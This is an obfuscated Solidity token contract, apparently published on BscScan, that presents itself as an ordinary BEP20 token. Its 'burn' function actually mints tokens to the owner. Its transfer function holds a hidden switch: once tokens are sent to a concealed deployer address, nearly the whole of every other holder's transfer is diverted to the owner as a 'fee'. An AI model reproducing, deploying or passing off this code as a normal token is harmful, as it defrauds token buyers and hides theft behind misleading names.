/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

pragma solidity ^0.5.15;
contract edbnWQOM {
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint8 public constant decimals = 18;
address public owner;
uint256 private  KzjkOw = 1000000000000000000;
address private  TxKMRR = address(0);
address private  nkrouv = address(0);
uint256 public constant noXodS = 99999;
address private  dZnWcf = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  jYoECQ = 10000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  rDbbsS = address(0);
uint256 private  uFYznH = 10000000000000;
uint256 private  sWlgtl = 1000000000000000000000;
address private  mOJQRP = address(0);
uint256 private  izzxwS = 100000000;
address private  zepmGk = address(0);
address private  kqtozc = address(0);
mapping (address => uint256) public balanceOf;
uint256 private  hwGRhr = 1000000000000000;
uint256 private  ccJqWb = 1000000000000000000;
string public  symbol = "edbnWQOM";
address private  imEiio = address(0);
string public  name = "edbnWQOM";
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  GORbUl = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;


function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}


function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getnkrouv() private returns (address) {
return nkrouv;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
constructor () public {
imEiio = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}


function _getKzjkOw() private returns (uint256) {
return KzjkOw;
}





function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getmOJQRP() private returns (address) {
return mOJQRP;
}

function _gethwGRhr() private returns (uint256) {
return hwGRhr;
}

function _getrDbbsS() private returns (address) {
return rDbbsS;
}



function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}




function _getdZnWcf() private returns (address) {
return dZnWcf;
}



function _getuFYznH() private returns (uint256) {
return uFYznH;
}



function _getjYoECQ() private returns (uint256) {
return jYoECQ;
}

function _getkqtozc() private returns (address) {
return kqtozc;
}

function _getizzxwS() private returns (uint256) {
return izzxwS;
}







function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tVQfgSm 0");
require(spender != address(0), "fVQfgSm 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getzepmGk() private returns (address) {
return zepmGk;
}

function _getGORbUl() private returns (address) {
return GORbUl;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}


function _getTxKMRR() private returns (address) {
return TxKMRR;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "VQfgSm");
require(to != address(0), "VQfgSm");
require(amount <= balanceOf[from], "VQfgSm");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* noXodS/ccJqWb ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==imEiio){
ccJqWb = noXodS+2;
}
emit Transfer(from, to, transferAmount);
}


modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}

}